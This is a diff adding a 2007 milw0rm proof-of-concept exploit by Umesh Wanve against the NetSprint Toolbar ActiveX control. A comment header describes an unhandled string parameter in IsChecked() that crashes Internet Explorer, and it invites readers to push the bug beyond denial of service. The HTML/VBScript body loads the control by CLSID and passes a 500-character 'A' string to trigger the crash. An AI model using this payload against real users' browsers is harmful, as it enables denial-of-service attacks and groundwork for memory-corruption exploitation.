@@ -1,0 +1,66 @@
+<!--
+
+  ===============================================================================================
+                        NetSprint Toolbar ActiveX toolbar.dll DOS POC
+                                            By Umesh Wanve 
+  ==============================================================================================   
+        
+  Date :     24-04-2007
+ 
+  Tested on: Windows 2000 SP4 Server English
+             Windows 2000 SP4 Professional English
+  
+  Reference: http://www.securityfocus.com/bid/23530
+
+  Vendor:    http://netsprint.pl/toolbar/install.html
+         
+
+
+  
+  Desc: This is very interesting vulnerability. The function ischecked() takes URL as string parameter.
+       But actually it is not handled by dll. When we don't give any parameter i.e. target.ischecked "" the 
+       IE works fine. But when we supply data as parameter the IE crashes. Interestingly you can able to 
+       see your data on the stack. But I am not able to overwrite any registers or SEH. So though our
+       data is on the stack. Its hard to exploit. So only dos. 
+
+       May be someone can get success in this. Let me know if u find.
+
+  
+  PS. This was written for educational purpose. Use it at your own risk.Author will be not be
+      responsible for any damage.
+ 
+  Always thanks to Metasploit and Stroke.
+
+-->
+
+
+<html>
+
+<title>
+ NetSprint Toolbar ActiveX toolbar.dll DOS POC - By Umesh Wanve
+</title>
+
+
+<body>
+<OBJECT id="target" WIDTH=445 HEIGHT=40 classid="clsid:34F459B8-1D37-4FF2-9EFA-192D8E3ABA6F" > </OBJECT>
+
+<script language="vbscript">
+
+
+targetFile = "C:\WINNT\Downloaded Program Files\toolbar.dll"
+prototype  = "Function IsChecked ( ByVal url As String ) As Long"
+memberName = "IsChecked"
+progid     = "SoftomateLib.SoftomateObj"
+argCount   = 1
+
+arg1=String(500, "A")
+
+target.IsChecked arg1
+
+</script>
+
+</body>
+
+</html>
+
+# milw0rm.com [2007-04-24]
